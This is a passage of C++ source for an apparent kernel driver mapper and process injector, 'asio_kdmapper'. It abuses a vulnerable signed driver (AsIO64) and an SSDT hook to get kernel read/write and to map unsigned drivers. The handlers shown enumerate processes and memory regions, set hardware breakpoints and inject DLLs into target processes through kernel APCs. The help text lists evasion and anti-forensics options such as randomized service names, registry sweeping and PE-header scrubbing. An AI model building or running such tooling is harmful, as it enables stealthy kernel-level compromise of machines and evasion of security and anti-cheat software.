    if (payload.size() < sizeof(AsioR0HwbpClearReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0HwbpClearReq*>(payload.data());
    if (req->dr_index > 3) return ASIO_ERR_BAD_PAYLOAD;

    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                 FALSE, req->tid);
    if (!hThread) return ASIO_ERR_RESOLVE;

    DWORD prev = SuspendThread(hThread);
    if (prev == (DWORD)-1) { CloseHandle(hThread); return ASIO_ERR_INTERNAL; }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread); CloseHandle(hThread); return ASIO_ERR_INTERNAL;
    }

    DWORD64* drs[] = { &ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3 };
    *drs[req->dr_index] = 0;

    const uint8_t i = req->dr_index;
    ctx.Dr7 &= ~(((DWORD64)1 << (2 * i)) | ((DWORD64)0xF << (16 + 4 * i)));

    if (!SetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread); CloseHandle(hThread); return ASIO_ERR_INTERNAL;
    }
    ResumeThread(hThread);
    CloseHandle(hThread);

    std::wcout << L"[+] HWBP clear: tid=" << req->tid << L" dr=" << (int)req->dr_index
               << std::endl;
    return ASIO_OK;
}

// PTE flags for region classification
static constexpr uint64_t kPtePresent    = 1ull << 0;
static constexpr uint64_t kPteReadWrite  = 1ull << 1;
static constexpr uint64_t kPteUser       = 1ull << 2;
static constexpr uint64_t kPteNx         = 1ull << 63;

// Derive MEMORY_BASIC_INFORMATION-like fields from a raw PTE.
static void PteToRegionInfo(uint64_t pte, bool isPresent,
                            uint32_t& state, uint32_t& protect, uint32_t& type) {
    type = 0x20000; // MEM_PRIVATE (default)
    if (isPresent && (pte & kPtePresent)) {
        state = 0x1000; // MEM_COMMIT
        bool rw  = (pte & kPteReadWrite) != 0;
        bool nx  = (pte & kPteNx) != 0;
        if (rw && !nx)     protect = 0x40; // PAGE_EXECUTE_READWRITE
        else if (rw && nx) protect = 0x04; // PAGE_READWRITE
        else if (!rw && !nx) protect = 0x20; // PAGE_EXECUTE_READ
        else               protect = 0x02; // PAGE_READONLY
    } else {
        state = 0x10000; // MEM_FREE
        protect = 0x01;  // PAGE_NOACCESS
    }
}

// VirtualQueryEx equivalent: find the contiguous region containing va.
static int32_t HandleQueryRegion(AsioProvider& kernel, PipeSession& s,
                                 const std::vector<uint8_t>& payload,
                                 std::vector<uint8_t>& out) {
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0QueryRegionReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0QueryRegionReq*>(payload.data());
    const uint64_t va = req->va;

    // Read the PTE for this VA
    uint64_t pte = 0;
    bool ok = ReadTargetPteRaw(kernel, s.cr3, va, pte);
    if (!ok) return ASIO_ERR_PHYS_IO;

    bool isPresent = (pte & kPtePresent) != 0;

    // Determine base: walk backward while PTEs have same present/absent state
    uint64_t base = va & ~0xFFFULL; // page-align
    while (base > 0) {
        uint64_t prevPte = 0;
        uint64_t prevVa = base - 0x1000;
        if (!ReadTargetPteRaw(kernel, s.cr3, prevVa, prevPte)) break;
        bool prevPresent = (prevPte & kPtePresent) != 0;
        if (prevPresent != isPresent) break;
        // For committed pages, also check protection matches
        if (isPresent) {
            uint32_t s1, p1, t1, s2, p2, t2;
            PteToRegionInfo(pte, isPresent, s1, p1, t1);
            PteToRegionInfo(prevPte, prevPresent, s2, p2, t2);
            if (p1 != p2) break;
        }
        base = prevVa;
    }

    // Determine end: walk forward while PTEs have same state
    uint64_t end = (va & ~0xFFFULL) + 0x1000;
    uint64_t maxAddr = 0x00007FFFFFFFFFFFULL; // user-mode ceiling
    while (end < maxAddr) {
        uint64_t nextPte = 0;
        if (!ReadTargetPteRaw(kernel, s.cr3, end, nextPte)) break;
        bool nextPresent = (nextPte & kPtePresent) != 0;
        if (nextPresent != isPresent) break;
        if (isPresent) {
            uint32_t s1, p1, t1, s2, p2, t2;
            PteToRegionInfo(pte, isPresent, s1, p1, t1);
            PteToRegionInfo(nextPte, nextPresent, s2, p2, t2);
            if (p1 != p2) break;
        }
        end += 0x1000;
    }

    AsioR0QueryRegionResp resp{};
    resp.base = base;
    resp.region_size = end - base;
    resp.allocation_base = base; // simplified — no VAD, so allocation_base == base
    resp.allocation_protect = 0;
    PteToRegionInfo(pte, isPresent, resp.state, resp.protect, resp._type);
    resp.allocation_protect = resp.protect;

    out.resize(sizeof(resp));
    memcpy(out.data(), &resp, sizeof(resp));
    return ASIO_OK;
}

// Bulk region snapshot: walk user-mode address space and return all regions.
// Multi-level page table walker for fast region enumeration.
// Skips 512GB/1GB/2MB gaps at PML4/PDPT/PD levels instead of
// walking every 4KB page across the 128TB user address space.
static void WalkPageTableForRegions(AsioProvider& kernel, uint64_t cr3,
                                    uint64_t rangeStart, uint64_t rangeEnd,
                                    std::vector<AsioR0RegionEntry>& regions) {
    constexpr uint64_t kPml4Span = 1ull << 39;   // 512 GB per PML4 entry
    constexpr uint64_t kPdptSpan = 1ull << 30;   // 1 GB per PDPT entry
    constexpr uint64_t kPdSpan   = 1ull << 21;   // 2 MB per PD entry
    constexpr uint64_t kPtSpan   = 1ull << 12;   // 4 KB per PT entry

    const uint64_t pml4Base = cr3 & kPhyAddressMask;

    // Active region tracking — coalesce adjacent pages with same protection
    uint64_t regionVa = 0, regionEnd = 0;
    uint32_t regionProtect = 0;

    auto FlushRegion = [&]() {
        if (regionVa == 0 || regionEnd <= regionVa) return;
        AsioR0RegionEntry e{};
        e.base = regionVa;
        e.region_size = regionEnd - regionVa;
        e.allocation_base = regionVa;
        e.state = 0x1000;   // MEM_COMMIT
        e.protect = regionProtect;
        e.allocation_protect = regionProtect;
        e._type = 0x20000;  // MEM_PRIVATE
        regions.push_back(e);
        regionVa = regionEnd = 0;
    };

    for (uint64_t pml4i = (rangeStart >> 39) & 0x1ff;
         pml4i < 512 && (pml4i << 39) < rangeEnd; ++pml4i) {

        uint64_t pml4e = 0;
        if (!kernel.ReadPhysical(pml4Base + pml4i * 8, &pml4e, 8) ||
            !(pml4e & kEntryPresent)) {
            FlushRegion();
            continue; // skip 512 GB
        }
        const uint64_t pdptBase = pml4e & kPhyAddressMask;

        for (uint64_t pdpti = 0; pdpti < 512; ++pdpti) {
            const uint64_t vaBlock = (pml4i << 39) | (pdpti << 30);
            if (vaBlock >= rangeEnd) { FlushRegion(); return; }
            if (vaBlock + kPdptSpan <= rangeStart) continue;

            uint64_t pdpte = 0;
            if (!kernel.ReadPhysical(pdptBase + pdpti * 8, &pdpte, 8) ||
                !(pdpte & kEntryPresent)) {
                FlushRegion();
                continue; // skip 1 GB
            }

            // 1 GB large page
            if (pdpte & kEntryPageSize) {
                uint32_t st, pr, tp;
                PteToRegionInfo(pdpte, true, st, pr, tp);
                if (regionVa && regionEnd == vaBlock && regionProtect == pr) {
                    regionEnd = vaBlock + kPdptSpan;
                } else {
                    FlushRegion();
                    regionVa = vaBlock;
                    regionEnd = vaBlock + kPdptSpan;
                    regionProtect = pr;
                }
                continue;
            }

            const uint64_t pdBase = pdpte & kPhyAddressMask;

            for (uint64_t pdi = 0; pdi < 512; ++pdi) {
                const uint64_t vaBlock2 = vaBlock | (pdi << 21);
                if (vaBlock2 >= rangeEnd) { FlushRegion(); return; }
                if (vaBlock2 + kPdSpan <= rangeStart) continue;

                uint64_t pde = 0;
                if (!kernel.ReadPhysical(pdBase + pdi * 8, &pde, 8) ||
                    !(pde & kEntryPresent)) {
                    FlushRegion();
                    continue; // skip 2 MB
                }

                // 2 MB large page
                if (pde & kEntryPageSize) {
                    uint32_t st, pr, tp;
                    PteToRegionInfo(pde, true, st, pr, tp);
                    if (regionVa && regionEnd == vaBlock2 && regionProtect == pr) {
                        regionEnd = vaBlock2 + kPdSpan;
                    } else {
                        FlushRegion();
                        regionVa = vaBlock2;
                        regionEnd = vaBlock2 + kPdSpan;
                        regionProtect = pr;
                    }
                    continue;
                }

                const uint64_t ptBase = pde & kPhyAddressMask;

                for (uint64_t pti = 0; pti < 512; ++pti) {
                    const uint64_t pageVa = vaBlock2 | (pti << 12);
                    if (pageVa >= rangeEnd) { FlushRegion(); return; }
                    if (pageVa + kPtSpan <= rangeStart) continue;

                    uint64_t pte = 0;
                    if (!kernel.ReadPhysical(ptBase + pti * 8, &pte, 8) ||
                        !(pte & kPtePresent)) {
                        FlushRegion();
                        continue;
                    }

                    uint32_t st, pr, tp;
                    PteToRegionInfo(pte, true, st, pr, tp);
                    if (regionVa && regionEnd == pageVa && regionProtect == pr) {
                        regionEnd = pageVa + kPtSpan;
                    } else {
                        FlushRegion();
                        regionVa = pageVa;
                        regionEnd = pageVa + kPtSpan;
                        regionProtect = pr;
                    }
                }
            }
        }
    }
    FlushRegion();
}

static int32_t HandleEnumRegions(AsioProvider& kernel, PipeSession& s,
                                 std::vector<uint8_t>& out) {
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;

    std::vector<AsioR0RegionEntry> regions;
    WalkPageTableForRegions(kernel, s.cr3, 0x10000, 0x00007FFFFFFFFFFFULL, regions);

    // Serialize: AsioR0RegionListResp + N * AsioR0RegionEntry
    AsioR0RegionListResp header{};
    header.count = static_cast<uint32_t>(regions.size());
    const size_t total = sizeof(header) + regions.size() * sizeof(AsioR0RegionEntry);
    out.resize(total);
    memcpy(out.data(), &header, sizeof(header));
    if (!regions.empty()) {
        memcpy(out.data() + sizeof(header), regions.data(),
               regions.size() * sizeof(AsioR0RegionEntry));
    }
    return ASIO_OK;
}

// ---------------------------------------------------------------------------
// ASIO_OP_ENUM_PROCS: walk kernel process list via PsGetNextProcess
// ---------------------------------------------------------------------------

static uint64_t DiscoverEprocessPidOffset(AsioProvider& kernel) {
    static uint64_t cached = 0;
    if (cached) return cached;

    const uint64_t selfEprocess = ResolveTargetEprocess(kernel, GetCurrentProcessId());
    if (!selfEprocess) return 0;

    const uint32_t selfPid = GetCurrentProcessId();

    for (uint64_t off = 0x200; off <= 0x800; off += 8) {
        uint64_t value = 0;
        if (kernel.ReadKernelMemory(selfEprocess + off, &value, sizeof(value))) {
            if (static_cast<uint32_t>(value) == selfPid && (value >> 32) == 0) {
                cached = off;
                std::wcout << L"[+] Auto-detected EPROCESS.UniqueProcessId offset: 0x"
                           << std::hex << off << std::dec << std::endl;
                return off;
            }
        }
    }
    std::wcerr << L"[-] Could not auto-detect EPROCESS.UniqueProcessId offset" << std::endl;
    return 0;
}

static uint64_t DiscoverEprocessImageNameOffset(AsioProvider& kernel) {
    static uint64_t cached = 0;
    if (cached) return cached;

    const uint64_t selfEprocess = ResolveTargetEprocess(kernel, GetCurrentProcessId());
    if (!selfEprocess) return 0;

    for (uint64_t off = 0x400; off <= 0x800; off += 8) {
        char buf[16] = {};
        if (kernel.ReadKernelMemory(selfEprocess + off, buf, 15)) {
            bool looksLikeName = true;
            bool hasAlpha = false;
            for (int i = 0; i < 15 && buf[i]; i++) {
                if (buf[i] < 0x20 || buf[i] > 0x7E) { looksLikeName = false; break; }
                if ((buf[i] >= 'a' && buf[i] <= 'z') || (buf[i] >= 'A' && buf[i] <= 'Z')) hasAlpha = true;
            }
            if (looksLikeName && hasAlpha && buf[0] != 0) {
                cached = off;
                std::wcout << L"[+] Auto-detected EPROCESS.ImageFileName offset: 0x"
                           << std::hex << off << std::dec
                           << L" (name: " << buf << L")" << std::endl;
                return off;
            }
        }
    }
    std::wcerr << L"[-] Could not auto-detect EPROCESS.ImageFileName offset" << std::endl;
    return 0;
}

static int32_t HandleEnumProcesses(AsioProvider& kernel,
                                   std::vector<uint8_t>& outBytes) {
    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
    const uint64_t psGetNext = kernel.GetKernelModuleExport(ntoskrnl, "PsGetNextProcess");
    if (!psGetNext) {
        std::wcerr << L"[-] PsGetNextProcess not found" << std::endl;
        return ASIO_ERR_RESOLVE;
    }

    const uint64_t pidOffset = DiscoverEprocessPidOffset(kernel);
    if (!pidOffset) return ASIO_ERR_RESOLVE;

    const uint64_t nameOffset = DiscoverEprocessImageNameOffset(kernel);
    if (!nameOffset) return ASIO_ERR_RESOLVE;

    struct ProcEntry {
        uint32_t pid;
        char name[16];
    };
    std::vector<ProcEntry> procs;

    uint64_t current = 0;
    for (int safety = 0; safety < 4096; ++safety) {
        uint64_t next = 0;
        if (!kernel.CallKernelFunction(&next, psGetNext, current)) {
            std::wcerr << L"[-] PsGetNextProcess call failed at iteration " << safety << std::endl;
            break;
        }
        if (!next) break;
        current = next;

        uint32_t pid = 0;
        char name[16] = {};
        if (!kernel.ReadKernelMemory(next + pidOffset, &pid, sizeof(pid))) continue;
        if (!pid) continue;
        kernel.ReadKernelMemory(next + nameOffset, name, 15);
        name[15] = '\0';

        ProcEntry e{};
        e.pid = pid;
        memcpy(e.name, name, 16);
        procs.push_back(e);
    }

    AsioR0ProcListResp header{};
    header.count = static_cast<uint32_t>(procs.size());

    outBytes.clear();
    outBytes.reserve(sizeof(header) + procs.size() * sizeof(AsioR0ProcEntry));
    const auto appendBytes = [&outBytes](const void* data, size_t size) {
        const auto* p = static_cast<const uint8_t*>(data);
        outBytes.insert(outBytes.end(), p, p + size);
    };
    appendBytes(&header, sizeof(header));
    for (const auto& e : procs) {
        AsioR0ProcEntry entry{};
        entry.pid = e.pid;
        memcpy(entry.name, e.name, 16);
        appendBytes(&entry, sizeof(entry));
    }

    std::wcout << L"[+] ENUM_PROCS: " << procs.size() << L" processes" << std::endl;
    return ASIO_OK;
}

static bool ServeOneClient(AsioProvider& kernel, HANDLE pipe, bool& shutdownRequested) {
    PipeSession s{};
    s.pipe = pipe;

    // RAII cleanup for the page-fault fallback process handle
    struct ProcessHandleGuard {
        HANDLE& h;
        ~ProcessHandleGuard() { if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); h = INVALID_HANDLE_VALUE; } }
    } processGuard{ s.targetProcess };

    for (;;) {
        AsioR0Header hdr{};
        if (!PipeReadAll(pipe, &hdr, sizeof(hdr))) return true;  // peer disconnect
        if (hdr.magic != ASIO_R0_REQ_MAGIC || hdr.version != ASIO_R0_PROTO_VERSION) {
            PipeSendResponse(pipe, ASIO_ERR_BAD_MAGIC, nullptr, 0);
            return true;
        }
        // Sanity bound: 256 MiB per request.
        if (hdr.payload_len > (256ull << 20)) {
            PipeSendResponse(pipe, ASIO_ERR_BAD_PAYLOAD, nullptr, 0);
            return true;
        }

        std::vector<uint8_t> payload;
        if (hdr.payload_len) {
            payload.resize(static_cast<size_t>(hdr.payload_len));
            if (!PipeReadAll(pipe, payload.data(), payload.size())) return true;
        }

        switch (hdr.opcode) {
        case ASIO_OP_PING:
            PipeSendResponse(pipe, ASIO_OK, nullptr, 0);
            break;

        case ASIO_OP_ATTACH: {
            const int32_t st = HandleAttach(kernel, s, payload);
            if (st == ASIO_OK) {
                AsioR0AttachResp out{ s.cr3, s.imageBase, s.imageSize };
                PipeSendResponse(pipe, ASIO_OK, &out, sizeof(out));
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_READ: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleRead(kernel, s, payload, bytes);
            if (st == ASIO_OK) {
                PipeSendResponse(pipe, ASIO_OK, bytes.data(), bytes.size());
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_WRITE: {
            uint64_t written = 0;
            const int32_t st = HandleWrite(kernel, s, payload, written);
            if (st == ASIO_OK) {
                PipeSendResponse(pipe, ASIO_OK, &written, sizeof(written));
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_GET_BASE: {
            AsioR0AttachResp out{};
            const int32_t st = HandleGetBase(s, out);
            if (st == ASIO_OK) {
                PipeSendResponse(pipe, ASIO_OK, &out, sizeof(out));
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_ENUM_MODULES: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleEnumModules(kernel, s, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_ALLOC: {
            uint64_t va = 0;
            const int32_t st = HandleAlloc(kernel, s, payload, va);
            if (st == ASIO_OK) {
                PipeSendResponse(pipe, ASIO_OK, &va, sizeof(va));
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_FREE: {
            const int32_t st = HandleFree(kernel, s, payload);
            PipeSendResponse(pipe, st, nullptr, 0);
            break;
        }

        case ASIO_OP_INJECT_DLL: {
            uint64_t remoteBase = 0;
            const int32_t st = HandleInjectDll(kernel, s, payload, remoteBase);
            if (st == ASIO_OK) {
                PipeSendResponse(pipe, ASIO_OK, &remoteBase, sizeof(remoteBase));
            } else {
                PipeSendResponse(pipe, st, nullptr, 0);
            }
            break;
        }

        case ASIO_OP_SCAN_AOB: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleScanAob(kernel, s, payload, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_SCAN_VALUE: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleScanValue(kernel, s, payload, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_SCAN_NEXT: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleScanNext(kernel, s, payload, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_HWBP_SET: {
            const int32_t st = HandleHwbpSet(kernel, s, payload);
            PipeSendResponse(pipe, st, nullptr, 0);
            break;
        }

        case ASIO_OP_HWBP_CLEAR: {
            const int32_t st = HandleHwbpClear(kernel, s, payload);
            PipeSendResponse(pipe, st, nullptr, 0);
            break;
        }

        case ASIO_OP_QUERY_REGION: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleQueryRegion(kernel, s, payload, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_ENUM_REGIONS: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleEnumRegions(kernel, s, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_ENUM_PROCS: {
            std::vector<uint8_t> bytes;
            const int32_t st = HandleEnumProcesses(kernel, bytes);
            PipeSendResponse(pipe, st, bytes.data(), bytes.size());
            break;
        }

        case ASIO_OP_SHUTDOWN:
            PipeSendResponse(pipe, ASIO_OK, nullptr, 0);
            shutdownRequested = true;
            return true;

        default:
            // Unknown opcode.
            PipeSendResponse(pipe, ASIO_ERR_BAD_OPCODE, nullptr, 0);
            break;
        }
    }
}

static int RunR0Server(AsioProvider& kernel, const std::wstring& pipeNameIn) {
    // pipe name: default pipes get a PID suffix to avoid namespace residue
    // / clash with previous server instances that crashed without cleanup.
    std::wstring pipeName;
    if (!pipeNameIn.empty() && pipeNameIn != ASIO_R0_DEFAULT_PIPE_W) {
        pipeName = pipeNameIn;
    } else {
        pipeName = std::wstring(ASIO_R0_DEFAULT_PIPE_W) + L"_" +
                   std::to_wstring(GetCurrentProcessId());
    }

    // hint file for the reader/inject harness to find the actual pipe name
    {
        wchar_t tempDir[MAX_PATH] = {};
        GetTempPathW(MAX_PATH, tempDir);
        wchar_t infoPath[MAX_PATH] = {};
        swprintf_s(infoPath, L"%sasio_pipe_name.txt", tempDir);
        FILE* fp = nullptr;
        if (_wfopen_s(&fp, infoPath, L"w") == 0 && fp) {
            std::fwprintf(fp, L"%s\n", pipeName.c_str());
            std::fclose(fp);
        }
    }

    std::wcout << L"[*] R0 IPC server listening on " << pipeName << std::endl;

    // SDDL: elevated admins, LOCAL_SYSTEM, and the current interactive logon
    // session. The interactive ACE lets a medium-integrity console client talk
    // to a server started from the same desktop without requiring UAC elevation.
    PSECURITY_DESCRIPTOR sd = nullptr;
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FA;;;IU)", SDDL_REVISION_1, &sd, nullptr)) {
        std::wcerr << L"[-] Failed to build pipe SDDL: " << GetLastError() << std::endl;
        return 1;
    }
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = sd;

    bool shutdownRequested = false;

    while (!shutdownRequested) {
        HANDLE pipe = CreateNamedPipeW(
            pipeName.c_str(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,  // avoid pseudo-busy on rapid reconnect
            64 * 1024,   // out buf
            64 * 1024,   // in buf
            0,           // default timeout
            &sa);
        if (pipe == INVALID_HANDLE_VALUE) {
            PrintWin32Error(L"CreateNamedPipeW");
            LocalFree(sd);
            return 1;
        }

        const BOOL ok = ConnectNamedPipe(pipe, nullptr);
        if (!ok && GetLastError() != ERROR_PIPE_CONNECTED) {
            PrintWin32Error(L"ConnectNamedPipe");
            CloseHandle(pipe);
            continue;
        }

        std::wcout << L"[+] R0 IPC client connected" << std::endl;
        ServeOneClient(kernel, pipe, shutdownRequested);
        FlushFileBuffers(pipe);
        DisconnectNamedPipe(pipe);
        CloseHandle(pipe);
        std::wcout << L"[*] R0 IPC client disconnected" << std::endl;
    }

    LocalFree(sd);
    std::wcout << L"[*] R0 IPC server shutting down" << std::endl;
    return 0;
}

static void PrintUsage() {
    std::wcout << LR"HELP(Usage:
  asio_kdmapper.exe [kernel options] <target.sys>
  asio_kdmapper.exe --inject-dll <target.dll>                       (R0 manual-map)
  asio_kdmapper.exe --inject-dll <target.dll> --target <pid|exe>   (R0-triggered R3 inject)

Three operating modes, all driven through the same AsIO64 + NtAddAtom
SSDT-hook primitive; no R3 syscall ever touches the target:
  - Default (.sys): map a driver into kernel pool, call DriverEntry in R0.
  - --inject-dll alone: map a DLL into kernel pool, call DllMain in R0.
  - --inject-dll + --target: allocate/write the image from R0, resolve user
    imports through the target PEB, then KAPC-deliver DllMain in target R3.

Options:
  --inject-dll <path>       Use DLL mapping mode.
  --target <pid|name.exe>   Required for R0-triggered R3 inject.
  --get-export <name>       R0 manual-map only; call an exported DLL function.
  --dump-exe <out.exe>      Dump target main image before optional injection.
  --asio <path>             Path to AsIO64_D38774B8F812.sys.
  --service <name>          Service name when loading AsIO64.
  --keep-asio               Keep AsIO64 loaded if this tool loaded it.
  --free                    Free mapped allocation after entry returns.
  --copy-header             Copy PE headers instead of skipping them.
  --pass-allocation-ptr     Pass allocation base as DriverEntry param1.
  --param1 <value>          Entry/export param1, accepts 0x prefix.
  --param2 <value>          Entry/export param2, accepts 0x prefix.
  --randomize-service       Replace service name with a random string.
  --copy-driver-to-temp     Copy .sys to %TEMP% with random name before loading.
  --sweep-registry          Deep-clean leftover service keys.
  --clean-init              Zero the INIT section in kernel memory.
  --persist                 Keep the kernel allocation after entry returns.
  --scrub-headers           After R3 inject, zero injected DLL PE headers.
  --server                  Serve R0 read/write requests on \\.\pipe\asio_r0.
  --pipe-name <name>        Override the named-pipe path used by --server.

Privilege:
  Loading AsIO64 requires an elevated administrator PowerShell/CMD.

Examples:
  Kernel driver map:
    asio_kdmapper.exe path\to\target.sys

  Kernel DLL manual-map:
    asio_kdmapper.exe --inject-dll path\to\kernel_dll.dll

  R3 DLL inject with R0 APC trigger:
    asio_kdmapper.exe --inject-dll path\to\payload.dll --target Game.exe
    asio_kdmapper.exe --inject-dll path\to\payload.dll --target 1234

  Dumper-7 inject:
    asio_kdmapper.exe --inject-dll E:\code\reverse\agnentReverse\Driver\tools\Dumper-7-main\x64\Release\Dumper-7.dll --target Game.exe
    asio_kdmapper.exe --inject-dll E:\code\reverse\agnentReverse\Driver\tools\Dumper-7-main\x64\Release\Dumper-7.dll --target 1234

  Dump target main EXE before injecting Dumper-7:
    asio_kdmapper.exe --target Game.exe --dump-exe game_dump.exe --inject-dll E:\code\reverse\agnentReverse\Driver\tools\Dumper-7-main\x64\Release\Dumper-7.dll
)HELP";
    return;

    std::wcout
        << L"Usage:\n"
        << L"  asio_kdmapper.exe [kernel options] <target.sys>\n"
        << L"  asio_kdmapper.exe --inject-dll <target.dll>                       (R0 manual-map)\n"
        << L"  asio_kdmapper.exe --inject-dll <target.dll> --target <pid|exe>   (R0-triggered R3 inject)\n\n"
        << L"Three operating modes, all driven through the same AsIO64 + NtAddAtom\n"
        << L"SSDT-hook primitive — no R3 syscall ever touches the target (no Open-\n"
        << L"Process / VirtualAllocEx / WriteProcessMemory / VirtualProtectEx /\n"
        << L"CreateRemoteThread / NtQueueApcThread):\n"
        << L"  - Default (.sys):  Map a driver into kernel pool, call DriverEntry in R0.\n"
        << L"  - --inject-dll alone: Map a DLL into kernel pool, call DllMain in R0.\n"
        << L"                        Imports must resolve against ntoskrnl / kernel modules.\n"
        << L"  - --inject-dll + --target: Allocate user-mode RWX in the target via R0\n"
        << L"                             (KeStackAttachProcess + ZwAllocateVirtualMemory),\n"
        << L"                             walk PEB->Ldr through target CR3 to resolve imports,\n"
        << L"                             physical-write the image through target CR3, then\n"
        << L"                             KAPC-deliver DllMain in target's R3 context.\n\n"
        << L"Options:\n"
        << L"  --inject-dll <path>       Use DLL mapping mode (see above)\n"
        << L"  --target <pid|name.exe>   Required for R0-triggered R3 inject. Either decimal\n"
        << L"                            PID or executable name (case-insensitive)\n"
        << L"  --get-export <name>       (R0 manual-map only) After DllMain, resolve <name>\n"
        << L"                            in the kernel-mapped DLL and call it via the same\n"
        << L"                            kernel-call hook (uses --param1/--param2)\n"
        << L"  --dump-exe <out.exe>      Read the target's main image (SizeOfImage bytes from\n"
        << L"                            PsGetProcessSectionBaseAddress) via the Pure-R0 path\n"
        << L"                            and write it to disk as a memory-aligned PE that IDA\n"
        << L"                            / Ghidra load directly. Requires --target. Can be\n"
        << L"                            combined with --inject-dll (snapshot, then inject).\n"
        << L"  --asio <path>             Path to AsIO64_D38774B8F812.sys\n"
        << L"  --service <name>          Service name when loading AsIO64 (default: AsIO64Lite)\n"
        << L"  --keep-asio               Keep AsIO64 loaded if this tool loaded it\n"
        << L"  --free                    Free mapped allocation after entry returns\n"
        << L"  --copy-header             Copy PE headers instead of skipping them (driver mode)\n"
        << L"  --pass-allocation-ptr     Pass allocation base as DriverEntry first argument\n"
        << L"  --param1 <value>          Entry/export param1, accepts 0x prefix\n"
        << L"  --param2 <value>          Entry/export param2, accepts 0x prefix\n"
        << L"  --randomize-service       Replace service name with a random string\n"
        << L"  --copy-driver-to-temp     Copy .sys to %%TEMP%% with random name before loading\n"
        << L"  --sweep-registry          Deep-clean leftover service keys (all ControlSet variants)\n"
        << L"  --clean-init              Zero the INIT section in kernel memory after entry returns\n"
        << L"  --persist                 Keep the kernel allocation after entry returns (skip FreePool)\n"
        << L"  --scrub-headers           After R3 inject, zero the MZ/PE headers of the injected DLL\n"
        << L"                            in the target's address space (anti-forensics)\n"
        << L"  --server                  Skip mapping and serve R0 read/write requests on\n"
        << L"                            \\\\.\\pipe\\asio_r0 to external clients (CE, UEDumper)\n"
        << L"  --pipe-name <name>        Override the named-pipe path used by --server\n\n"
        << L"Examples:\n"
        << L"  Kernel driver map:\n"
        << L"    asio_kdmapper.exe path\\to\\target.sys\n"
        << L"  Kernel DLL manual-map:\n"
        << L"    asio_kdmapper.exe --inject-dll path\\to\\kernel_dll.dll\n"
        << L"  R3 DLL inject with R0 APC trigger:\n"
        << L"    asio_kdmapper.exe --inject-dll path\\to\\payload.dll --target Game.exe\n"
        << L"  Dumper-7 inject:\n"
        << L"    asio_kdmapper.exe --inject-dll E:\\code\\reverse\\agnentReverse\\Driver\\tools\\Dumper-7-main\\x64\\Release\\Dumper-7.dll --target Game.exe\n"
        << L"    asio_kdmapper.exe --inject-dll E:\\code\\reverse\\agnentReverse\\Driver\\tools\\Dumper-7-main\\x64\\Release\\Dumper-7.dll --target <pid>\n"
        << L"  Dump target main EXE before injecting Dumper-7:\n"
        << L"    asio_kdmapper.exe --target Game.exe --dump-exe game_dump.exe --inject-dll E:\\code\\reverse\\agnentReverse\\Driver\\tools\\Dumper-7-main\\x64\\Release\\Dumper-7.dll\n";
}

static std::wstring NarrowPipeName(const std::wstring& value) {
    if (value.empty()) {
        return ASIO_R0_DEFAULT_PIPE_W;
    }

    if (value.rfind(LR"(\\.\pipe\)", 0) == 0) {
        return value;
    }

    return LR"(\\.\pipe\)" + value;
}

static bool ParseCommandLine(int argc, wchar_t** argv, CliOptions& options) {
    for (int i = 1; i < argc; ++i) {
        const std::wstring arg = argv[i];
        auto requireValue = [&](const wchar_t* name) -> std::wstring {
            if (i + 1 >= argc) {
                std::wcerr << L"[-] Missing value for " << name << std::endl;
                throw std::runtime_error("missing option value");
            }
            return argv[++i];
        };

        try {
            if (arg == L"--help" || arg == L"-h") {
                options.ShowHelp = true;
                return true;
            }
            if (arg == L"--inject-dll") {
                // Default DLL mode is R0 manual-map; --target upgrades to R3 inject.
                if (options.Mode != RunMode::RemoteProcessDll) {
                    options.Mode = RunMode::KernelDll;
                    options.Mapper.IsDllImage = true;
                }
                options.TargetPath = requireValue(L"--inject-dll");
            } else if (arg == L"--target") {
                const std::wstring v = requireValue(L"--target");
                wchar_t* end = nullptr;
                const unsigned long pid = wcstoul(v.c_str(), &end, 0);
                if (end && *end == L'\0' && pid != 0) {
                    options.TargetPid = static_cast<DWORD>(pid);
